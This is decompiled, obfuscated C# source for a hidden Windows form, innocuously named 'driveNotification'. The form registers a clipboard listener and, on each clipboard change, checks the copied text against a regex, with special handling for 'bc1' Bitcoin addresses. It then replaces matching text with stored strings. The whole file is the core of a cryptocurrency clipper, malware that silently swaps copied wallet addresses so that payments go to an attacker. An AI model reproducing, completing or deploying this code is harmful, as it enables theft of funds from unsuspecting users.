using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using ns0;

namespace ConsoleApplication7;

public sealed class driveNotification
{
	public class NotificationForm : Form
	{
		[CompilerGenerated]
		private sealed class Class3
		{
			public string string_0;

			public void method_0()
			{
				string_0 = Delegate51.smethod_0();
			}
		}

		[CompilerGenerated]
		private sealed class Class4
		{
			public string string_0;

			public void method_0()
			{
				Delegate40.smethod_0(string_0);
			}
		}

		private static string string_0 = Delegate57.smethod_0();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams val = Delegate87.smethod_0(this);
				Delegate63.smethod_0(val, Delegate93.smethod_0(val) | 0x80);
				return val;
			}
		}

		public NotificationForm()
		{
			Class0.Class1.SetParent(Delegate116.smethod_0(this), Class0.Class1.intptr_0);
			Class0.Class1.AddClipboardFormatListener(Delegate116.smethod_0(this));
		}

		private bool method_0(Regex regex_0)
		{
			if (Delegate34.smethod_0(Delegate139.smethod_0(regex_0, string_0)))
			{
				return true;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (Delegate22.smethod_0(ref m) == 797)
			{
				string_0 = Delegate57.smethod_0();
				if (Delegate69.smethod_0(string_0, "bc1"))
				{
					if (method_0(Class0.regex_0) && !Delegate16.smethod_0(string_0, Class0.string_13))
					{
						string text = Delegate75.smethod_0(Class0.regex_0, string_0, Class0.string_13);
						Delegate111.smethod_0(text);
					}
				}
				else if (method_0(Class0.regex_0) && !Delegate16.smethod_0(string_0, Class0.string_11))
				{
					string text2 = Delegate75.smethod_0(Class0.regex_0, string_0, Class0.string_11);
					Delegate111.smethod_0(text2);
				}
			}
			Delegate151.smethod_0(this, ref m);
		}

		public static string GetText()
		{
			string string_0 = string.Empty;
			Thread object_ = Delegate12.smethod_0(delegate
			{
				string_0 = Delegate51.smethod_0();
			});
			Delegate81.smethod_0(object_, ApartmentState.STA);
			Delegate71.smethod_1(object_);
			Delegate99.smethod_0(object_);
			return string_0;
		}

		public static void SetText(string txt)
		{
			Thread object_ = Delegate12.smethod_0(delegate
			{
				Delegate40.smethod_0(txt);
			});
			Delegate81.smethod_0(object_, ApartmentState.STA);
			Delegate71.smethod_1(object_);
			Delegate99.smethod_0(object_);
		}
	}
}
